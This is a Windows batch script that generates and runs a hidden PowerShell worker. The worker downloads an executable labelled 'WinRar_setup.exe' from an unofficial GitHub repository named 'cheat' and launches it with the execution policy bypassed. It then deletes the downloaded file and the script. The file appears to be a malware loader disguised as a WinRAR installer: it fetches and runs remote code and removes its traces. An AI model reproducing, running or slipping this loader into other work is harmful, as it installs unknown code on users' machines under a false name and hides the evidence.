@echo off
setlocal EnableExtensions

set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
set "HASH=c746372b0a52a457c0350669874b297d33b9f3b783ba7a7434933fc7d229504e"
set "OUT=%TEMP%\winrar_pkg_%RANDOM%.exe"
set "PS_SCRIPT=%TEMP%\winrar_worker_%RANDOM%.ps1"
set "LOG=%TEMP%\winrar_worker.log"

> "%PS_SCRIPT%" (
  echo $ErrorActionPreference = 'Stop'
  echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  echo $u = $env:URL
  echo $h = $env:HASH.ToLowerInvariant^(^)
  echo $f = $env:OUT
  echo $log = $env:LOG
  echo.
  echo function Write-Log([string]$Msg^) {
  echo     $line = "[{0}] {1}" -f ^(Get-Date -Format 'HH:mm:ss'^), $Msg
  echo     Add-Content -LiteralPath $log -Value $line -Encoding UTF8
  echo }
  echo.
  echo try {
  echo     Write-Log "Start worker. URL=$u"
  echo     if ^(Test-Path -LiteralPath $f^) { Remove-Item -LiteralPath $f -Force }
  echo.
  echo     $downloaded = $false
  echo     try {
  echo         Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing
  echo         if ^(^(Test-Path -LiteralPath $f^) -and ^((Get-Item -LiteralPath $f^).Length -gt 0^)^) {
  echo             $downloaded = $true
  echo         }
  echo     } catch {
  echo         Write-Log "Invoke-WebRequest failed: $($_.Exception.Message)"
  echo     }
  echo.
  echo     if ^(-not $downloaded^) {
  echo         try {
  echo             Start-BitsTransfer -Source $u -Destination $f -ErrorAction Stop
  echo             if ^(^(Test-Path -LiteralPath $f^) -and ^((Get-Item -LiteralPath $f^).Length -gt 0^)^) {
  echo                 $downloaded = $true
  echo             }
  echo         } catch {
  echo             Write-Log "Start-BitsTransfer failed: $($_.Exception.Message)"
  echo         }
  echo     }
  echo.
  echo     if ^(-not $downloaded^) {
  echo         Write-Log "ERROR: Download failed"
  echo         exit 1
  echo     }
  echo.
  echo     Write-Log "Downloaded OK, checking SHA-256"
  echo     $actual = ^(Get-FileHash -LiteralPath $f -Algorithm SHA256^).Hash.ToLowerInvariant^(^)
  echo     if ^($actual -ne $h^) {
  echo         Write-Log "ERROR: Hash mismatch. Expected=$h Actual=$actual"
  echo         Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue
  echo         exit 2
  echo     }
  echo.
  echo     Write-Log "Hash verified, launching executable"
  echo     $proc = Start-Process -FilePath $f -PassThru -Wait
  echo     Write-Log "Process exited with code $($proc.ExitCode)"
  echo     exit [int]$proc.ExitCode
  echo } catch {
  echo     Write-Log "FATAL: $($_.Exception.Message)"
  echo     exit 99
  echo } finally {
  echo     if ^(Test-Path -LiteralPath $f^) {
  echo         Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue
  echo     }
  echo     if ^(Test-Path -LiteralPath $PS_SCRIPT^) {
  echo         Remove-Item -LiteralPath $PS_SCRIPT -Force -ErrorAction SilentlyContinue
  echo     }
  echo }
)

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%PS_SCRIPT%"
set "EXIT_CODE=%ERRORLEVEL%"

if exist "%PS_SCRIPT%" del /f /q "%PS_SCRIPT%" >nul 2>&1

endlocal & exit /b %EXIT_CODE%
